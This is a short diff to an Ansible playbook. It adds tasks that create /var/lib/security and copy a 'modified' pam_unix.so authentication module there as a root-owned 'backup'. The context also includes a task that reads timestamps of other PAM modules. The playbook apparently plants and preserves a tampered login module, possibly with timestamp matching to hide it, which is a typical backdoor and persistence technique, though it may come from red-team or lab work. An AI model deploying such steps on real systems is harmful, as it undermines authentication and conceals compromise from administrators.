@@ -20,6 +20,19 @@
     mode: 0644
   check_mode: false
 
+- name: Create backup backup file directory
+  ansible.builtin.file:
+    path: /var/lib/security
+    state: directory
+
+- name: Copy over modified file to backup backup directory
+  ansible.builtin.copy:
+    src: pam_unix.so
+    dest: /var/lib/security/pam_unix.so
+    owner: root
+    group: root
+    mode: 0644
+
 - name: Get timestamps of other PAM modules
   ansible.builtin.stat:
     path: /usr/lib/x86_64-linux-gnu/security/pam_permit.so
